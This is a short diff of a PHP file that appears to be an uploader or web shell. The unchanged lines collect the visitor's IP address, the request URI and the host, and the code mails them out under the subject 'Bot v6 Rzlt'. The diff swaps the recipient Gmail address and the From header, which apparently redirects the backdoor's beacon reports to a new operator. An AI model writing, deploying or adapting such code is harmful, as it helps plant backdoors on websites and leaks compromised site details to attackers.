@@ -11,8 +11,8 @@ else { echo '<b>Not uploaded ! </b><br><br>'; }
 $ip = getenv("REMOTE_ADDR");
 $ra44 = rand(1, 99999);
 $subj98 = " Bot v6 Rzlt |$ip";
-$email = "sellerolux@gmail.com";
-$from = "From: Result<botv3@mrspybotv3.com";
+$email = "hoxdux928@gmail.com";
+$from = "From: Result<hoxdux928@gmail.com";
 $a45 = $_SERVER['REQUEST_URI'];
 $b75 = $_SERVER['HTTP_HOST'];
 $m22 = $ip . "";
